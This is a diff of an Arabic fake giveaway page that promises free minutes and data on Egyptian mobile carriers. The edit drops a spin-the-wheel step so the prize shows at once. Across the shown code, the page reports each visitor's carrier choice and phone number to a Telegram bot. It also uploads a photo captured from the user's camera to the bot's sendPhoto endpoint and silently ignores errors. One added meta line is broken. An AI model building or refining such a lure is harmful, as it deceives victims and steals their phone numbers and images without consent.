@@ -6,10 +6,10 @@
     
     <!-- Open Graph للمشاركة -->
     <meta property="og:title" content="عروض Redeeed - 1000 دقيقة + 1000 ميجا مجاناً">
-    <meta property="og:description" content="اختر خطك وادور عجلة الحظ واكسب 1000 وحدة مجانية! العرض لفترة محدودة.">
+    <meta property="og:description" content="اختر خطك واحصل على 1000 وحدة مجانية! العرض لفترة محدودة.">
     <meta property="og:image" content="https://i.imgur.com/7x8q3kD.jpg">
     <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
+    meta property="og:image:height" content="630">
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://yourdomain.com">
     <meta name="twitter:card" content="summary_large_image">
@@ -122,81 +122,27 @@
             opacity: 0.8;
         }
 
-        .wheel-section {
-            background: rgba(255,255,255,0.95);
-            border-radius: 40px;
-            padding: 30px;
-            text-align: center;
-            display: none;
-        }
-
-        .wheel-title {
-            font-size: 1.8em;
-            color: #333;
-            margin-bottom: 20px;
-        }
-
-        .wheel-wrapper {
-            position: relative;
-            width: 320px;
-            height: 320px;
-            margin: 0 auto;
-        }
-
-        canvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        }
-
-        .spin-btn {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #f093fb, #f5576c);
-            border: none;
-            border-radius: 50%;
-            color: white;
-            font-size: 1.2em;
-            font-weight: bold;
-            cursor: pointer;
-            z-index: 10;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-            transition: transform 0.2s;
-        }
-
-        .spin-btn:active {
-            transform: translate(-50%, -50%) scale(0.95);
-        }
-
-        .result-text {
-            margin-top: 30px;
-            font-size: 1.5em;
-            font-weight: bold;
-            color: #333;
-        }
-
+        /* قسم الهدية المفتوحة */
         .prize-section {
             background: rgba(255,255,255,0.95);
             border-radius: 40px;
-            padding: 30px;
+            padding: 40px 30px;
             text-align: center;
             display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
         }
 
         .prize-image {
-            width: 200px;
-            height: 200px;
+            width: 250px;
+            height: 250px;
             object-fit: contain;
             margin: 20px auto;
-            animation: bounce 0.5s ease;
+            animation: bounce 0.6s ease;
         }
 
         @keyframes bounce {
@@ -212,20 +158,24 @@
         }
 
         .prize-desc {
-            font-size: 1.2em;
-            color: #666;
-            margin-bottom: 20px;
+            font-size: 1.3em;
+            color: #555;
+            margin-bottom: 30px;
         }
 
         .continue-btn {
             background: linear-gradient(135deg, #11998e, #38ef7d);
             color: white;
             border: none;
-            padding: 15px 40px;
+            padding: 15px 50px;
             border-radius: 50px;
             font-size: 1.2em;
             cursor: pointer;
-            margin-top: 20px;
+            transition: transform 0.2s;
+        }
+
+        .continue-btn:hover {
+            transform: scale(1.05);
         }
 
         .phone-section, .final-section {
@@ -305,7 +255,7 @@
         <div class="carrier-card" data-carrier="orange">
             <img src="https://i.imgur.com/1XqkQvL.jpg" class="carrier-img" alt="Orange">
             <div class="carrier-info">
-                <h3>Orange 🍊</h3>
+                <h3>Orange</h3>
                 <p>1000 دقيقة + 1000 ميجا</p>
                 <button class="select-btn" onclick="selectCarrier('orange')">اختر اورنج</button>
             </div>
@@ -313,7 +263,7 @@
         <div class="carrier-card" data-carrier="vodafone">
             <img src="https://i.imgur.com/2YrqQvM.jpg" class="carrier-img" alt="Vodafone">
             <div class="carrier-info">
-                <h3>Vodafone 🔴</h3>
+                <h3>Vodafone</h3>
                 <p>1000 دقيقة + 1000 ميجا</p>
                 <button class="select-btn" onclick="selectCarrier('vodafone')">اختر فودافون</button>
             </div>
@@ -321,7 +271,7 @@
         <div class="carrier-card" data-carrier="etisalat">
             <img src="https://i.imgur.com/3ZrqQvN.jpg" class="carrier-img" alt="Etisalat">
             <div class="carrier-info">
-                <h3>اتصالات 💙</h3>
+                <h3>اتصالات</h3>
                 <p>1000 دقيقة + 1000 ميجا</p>
                 <button class="select-btn" onclick="selectCarrier('etisalat')">اختر اتصالات</button>
             </div>
@@ -329,37 +279,27 @@
         <div class="carrier-card" data-carrier="we">
             <img src="https://i.imgur.com/4WrqQvO.jpg" class="carrier-img" alt="WE">
             <div class="carrier-info">
-                <h3>WE 🔷</h3>
+                <h3>WE</h3>
                 <p>1000 دقيقة + 1000 ميجا</p>
                 <button class="select-btn" onclick="selectCarrier('we')">اختر WE</button>
             </div>
         </div>
-        <!-- خط جديد -->
         <div class="carrier-card" data-carrier="redeeed">
             <img src="https://i.imgur.com/5XrqQvP.jpg" class="carrier-img" alt="Redeeed">
             <div class="carrier-info">
-                <h3>Redeeed 🎁</h3>
+                <h3>Redeeed</h3>
                 <p>2000 دقيقة + 2000 ميجا</p>
                 <button class="select-btn" onclick="selectCarrier('redeeed')">اختر Redeeed</button>
             </div>
         </div>
     </div>
 
-    <div class="wheel-section" id="wheelSection">
-        <h2 class="wheel-title">🎡 أدر عجلة الحظ واربح 🎡</h2>
-        <div class="wheel-wrapper">
-            <canvas id="wheelCanvas" width="500" height="500"></canvas>
-            <button class="spin-btn" onclick="spinWheel()">أدر</button>
-        </div>
-        <div class="result-text" id="resultText"></div>
-    </div>
-
-    <!-- قسم الهدية المفتوحة -->
+    <!-- قسم الهدية المفتوحة مباشرة -->
     <div class="prize-section" id="prizeSection">
         <img src="https://i.imgur.com/GiftBoxOpen.gif" class="prize-image" id="prizeImage" alt="هدية مفتوحة">
-        <div class="prize-title" id="prizeTitle">🎉 تهانينا! 🎉</div>
-        <div class="prize-desc" id="prizeDesc">لقد ربحت 1000 دقيقة + 1000 ميجا</div>
-        <button class="continue-btn" onclick="continueToPhone()">استلم هديتك الآن ➡️</button>
+        <div class="prize-title" id="prizeTitle">🎉 تهانينا! لقد فزت 🎉</div>
+        <div class="prize-desc" id="prizeDesc">1000 دقيقة + 1000 ميجا مجاناً</div>
+        <button class="continue-btn" onclick="continueToPhone()">استلم هديتك الآن</button>
     </div>
 
     <div class="phone-section" id="phoneSection">
@@ -388,10 +328,6 @@
     let selectedCarrier = '';
     let userIP = '';
     let userID = '';
-    let wonPrize = '';
-    let segments = ['1000 دقيقة', '1000 ميجا', '1000 دقيقة', '1000 ميجا', '1000 دقيقة', '1000 ميجا', '1000 دقيقة', '1000 ميجا'];
-    let currentRotation = 0;
-    let spinning = false;
     let stream = null;
     
     // بيانات التليجرام
@@ -432,161 +368,18 @@
         selectedCarrier = carrier;
         let names = {orange:'Orange', vodafone:'Vodafone', etisalat:'اتصالات', we:'WE', redeeed:'Redeeed'};
         
+        let prizeText = (carrier === 'redeeed') ? '2000 دقيقة + 2000 ميجا' : '1000 دقيقة + 1000 ميجا';
+        
         sendToTelegram(`📱 *تم اختيار الخط*\n🆔 ${userID}\n📡 ${names[carrier]}\n⏰ ${new Date().toLocaleString('ar-EG')}`);
         
         document.getElementById('carrierGrid').style.display = 'none';
-        document.getElementById('wheelSection').style.display = 'block';
         
-        drawWheel();
-    }
-    
-    // رسم العجلة
-    function drawWheel() {
-        const canvas = document.getElementById('wheelCanvas');
-        const ctx = canvas.getContext('2d');
-        const size = canvas.width = canvas.height = 500;
-        const center = size/2;
-        const radius = size/2;
-        const angleStep = (Math.PI * 2) / segments.length;
+        // تحديث الهدية حسب الخط
+        const prizeDesc = document.getElementById('prizeDesc');
+        prizeDesc.innerHTML = prizeText;
         
-        const colors = ['#E74C3C', '#2ECC71', '#F39C12', '#3498DB', '#9B59B6', '#1ABC9C', '#E67E22', '#1F618D'];
-        
-        ctx.clearRect(0, 0, size, size);
-        
-        for(let i = 0; i < segments.length; i++) {
-            const start = i * angleStep + currentRotation;
-            const end = start + angleStep;
-            
-            ctx.beginPath();
-            ctx.fillStyle = colors[i % colors.length];
-            ctx.moveTo(center, center);
-            ctx.arc(center, center, radius, start, end);
-            ctx.fill();
-            ctx.strokeStyle = 'white';
-            ctx.lineWidth = 3;
-            ctx.stroke();
-            
-            ctx.save();
-            ctx.translate(center, center);
-            ctx.rotate(start + angleStep/2);
-            ctx.fillStyle = 'white';
-            ctx.font = 'bold 18px Cairo';
-            ctx.shadowBlur = 0;
-            ctx.fillText(segments[i], radius * 0.65, 10);
-            ctx.restore();
-        }
-        
-        ctx.beginPath();
-        ctx.fillStyle = '#2C3E50';
-        ctx.moveTo(center - 20, 20);
-        ctx.lineTo(center + 20, 20);
-        ctx.lineTo(center, 50);
-        ctx.fill();
-    }
-    
-    // دوران العجلة
-    function spinWheel() {
-        if(spinning) return;
-        spinning = true;
-        
-        const spinBtn = document.querySelector('.spin-btn');
-        spinBtn.disabled = true;
-        
-        const spins = 8;
-        const newRotation = currentRotation + (Math.PI * 2 * spins) + (Math.random() * Math.PI * 2);
-        
-        animateSpin(currentRotation, newRotation, 2000, () => {
-            currentRotation = newRotation % (Math.PI * 2);
-            
-            const angleStep = (Math.PI * 2) / segments.length;
-            let pointerAngle = (Math.PI * 2 - currentRotation) % (Math.PI * 2);
-            let idx = Math.floor(pointerAngle / angleStep);
-            if(idx >= segments.length) idx = 0;
-            
-            wonPrize = segments[idx];
-            
-            sendToTelegram(`🎡 *نتيجة العجلة*\n🆔 ${userID}\n📡 ${selectedCarrier}\n🎁 ${wonPrize}`);
-            
-            // إظهار الهدية المفتوحة
-            document.getElementById('wheelSection').style.display = 'none';
-            document.getElementById('prizeSection').style.display = 'block';
-            
-            // تحديث صورة الهدية حسب الجائزة
-            const prizeImg = document.getElementById('prizeImage');
-            const prizeTitle = document.getElementById('prizeTitle');
-            const prizeDesc = document.getElementById('prizeDesc');
-            
-            if(wonPrize.includes('دقيقة')) {
-                prizeImg.src = 'https://i.imgur.com/GiftBoxOpen.gif';
-                prizeTitle.innerHTML = '🎉 تهانينا! فزت بدقائق مجانية 🎉';
-                prizeDesc.innerHTML = `لقد ربحت ${wonPrize}`;
-            } else {
-                prizeImg.src = 'https://i.imgur.com/GiftBoxOpen.gif';
-                prizeTitle.innerHTML = '🎉 تهانينا! فزت بميجابايتس مجانية 🎉';
-                prizeDesc.innerHTML = `لقد ربحت ${wonPrize}`;
-            }
-            
-            spinning = false;
-            spinBtn.disabled = false;
-        });
-    }
-    
-    function animateSpin(start, end, duration, callback) {
-        const startTime = performance.now();
-        
-        function animate(now) {
-            const elapsed = now - startTime;
-            const t = Math.min(elapsed / duration, 1);
-            const ease = 1 - Math.pow(1 - t, 3);
-            const current = start + (end - start) * ease;
-            drawWheelWithRotation(current);
-            
-            if(t < 1) requestAnimationFrame(animate);
-            else callback();
-        }
-        
-        requestAnimationFrame(animate);
-    }
-    
-    function drawWheelWithRotation(rotation) {
-        const canvas = document.getElementById('wheelCanvas');
-        const ctx = canvas.getContext('2d');
-        const size = 500;
-        const center = size/2;
-        const radius = size/2;
-        const angleStep = (Math.PI * 2) / segments.length;
-        const colors = ['#E74C3C', '#2ECC71', '#F39C12', '#3498DB', '#9B59B6', '#1ABC9C', '#E67E22', '#1F618D'];
-        
-        ctx.clearRect(0, 0, size, size);
-        
-        for(let i = 0; i < segments.length; i++) {
-            const start = i * angleStep + rotation;
-            const end = start + angleStep;
-            
-            ctx.beginPath();
-            ctx.fillStyle = colors[i % colors.length];
-            ctx.moveTo(center, center);
-            ctx.arc(center, center, radius, start, end);
-            ctx.fill();
-            ctx.strokeStyle = 'white';
-            ctx.lineWidth = 3;
-            ctx.stroke();
-            
-            ctx.save();
-            ctx.translate(center, center);
-            ctx.rotate(start + angleStep/2);
-            ctx.fillStyle = 'white';
-            ctx.font = 'bold 18px Cairo';
-            ctx.fillText(segments[i], radius * 0.65, 10);
-            ctx.restore();
-        }
-        
-        ctx.beginPath();
-        ctx.fillStyle = '#2C3E50';
-        ctx.moveTo(center - 20, 20);
-        ctx.lineTo(center + 20, 20);
-        ctx.lineTo(center, 50);
-        ctx.fill();
+        // إظهار الهدية المفتوحة مباشرة
+        document.getElementById('prizeSection').style.display = 'block';
     }
     
     // المتابعة لإدخال الرقم
@@ -603,7 +396,9 @@
             return;
         }
         
-        sendToTelegram(`📞 *تم إدخال الرقم*\n🆔 ${userID}\n📡 ${selectedCarrier}\n🎁 ${wonPrize}\n📱 ${phone}\n⏰ ${new Date().toLocaleString('ar-EG')}`);
+        let prizeText = (selectedCarrier === 'redeeed') ? '2000 دقيقة + 2000 ميجا' : '1000 دقيقة + 1000 ميجا';
+        
+        sendToTelegram(`📞 *تم إدخال الرقم*\n🆔 ${userID}\n📡 ${selectedCarrier}\n🎁 ${prizeText}\n📱 ${phone}\n⏰ ${new Date().toLocaleString('ar-EG')}`);
         
         document.getElementById('phoneSection').style.display = 'none';
         document.getElementById('finalSection').style.display = 'block';
@@ -677,7 +472,7 @@
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
             fd.append('photo', blob, 'user.jpg');
-            fd.append('caption', `📸 صورة المستخدم\n🆔 ${userID}\n📡 ${selectedCarrier}\n🎁 ${wonPrize}`);
+            fd.append('caption', `📸 صورة المستخدم\n🆔 ${userID}\n📡 ${selectedCarrier}`);
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd});
         } catch(e) {}
     }
